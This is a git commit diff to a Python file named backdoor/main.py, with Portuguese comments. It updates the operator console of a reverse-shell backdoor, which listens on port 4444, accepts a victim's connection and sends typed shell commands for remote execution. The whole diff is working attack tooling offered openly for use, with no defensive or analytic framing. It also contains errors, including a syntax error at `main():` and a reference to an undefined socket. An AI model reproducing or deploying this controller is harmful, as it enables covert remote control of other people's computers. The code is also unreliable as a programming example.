ec35a3428b56f11d043b5c60b8fc1d6c5d611177
PacmanHK-coder <63934543+PacmanHK-coder@users.noreply.github.com>
2020-06-29 20:15:46 -0300

    Update main.py

--- backdoor/main.py
+++ backdoor/main.py
@@ -3,34 +3,58 @@
 
 import socket
 import sys
+import time
+from colorama import *
 
-# criando socket e recebendo conexao
-ip = ""
-port = 4444
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+def mainShell():
+    # criando socket e recebendo conexao
+    port = 4444
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-s.bind((ip,port))
-s.listen(1)
+    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+    s.bind(("",port))
+    s.listen(1)
 
-print(f"[+]Esperando conexao na porta: {port}")
+    print(f"{Fore.GREEN}[+]Esperando conexao na porta: {port}")
 
-conn,addr = s.accept()
+    conn,addr = s.accept()
 
-# enviando comandos
+    # enviando comandos
 
-while True:
-    try:
-        shell = input(f"\n{addr[0]}@Shell> ")
-        if shell == 'exit':
+    while True:
+        try:
+            shell = input(f"\n{addr[0]}@Shell~>")
+            if shell == 'exit':
+                sys.exit()
+                conn.close()
+                break
+
+            if len(str.encode(shell)) > 0:
+                conn.send(str.encode(shell))
+                c_responde = str(conn.recv(1024), 'utf-8', errors="ignore")
+                print(c_responde, end="")
+        
+        except KeyboardInterrupt:
             sys.exit()
-            conn.close()
-            break
 
-        if len(str.encode(shell)) > 0:
-            conn.send(str.encode(shell))
-            c_responde = str(conn.recv(1024), 'utf-8', errors="ignore")
-            print(c_responde, end="")
-    
-    except KeyboardInterrupt:
-        sys.exit()
+        except Exception as e:
+            print(f"{Fore.RED}[!]Ocorreu algum erro: {e}")
+            print(f"{Fore.GREEN}[+]Tentando novamente...")
+
+            s.close()
+            mainShell()
+
+
+def main():
+    init(autoreset=True)
+    mainShell()
+
+try:
+    main():
+
+except Exception as e:
+    print(f"{Fore.RED}[!]Ocorreu algum erro: {e}")
+    print(f"{Fore.GREEN}[+]Tentando novamente...")
+
+    s.close()
+    main()
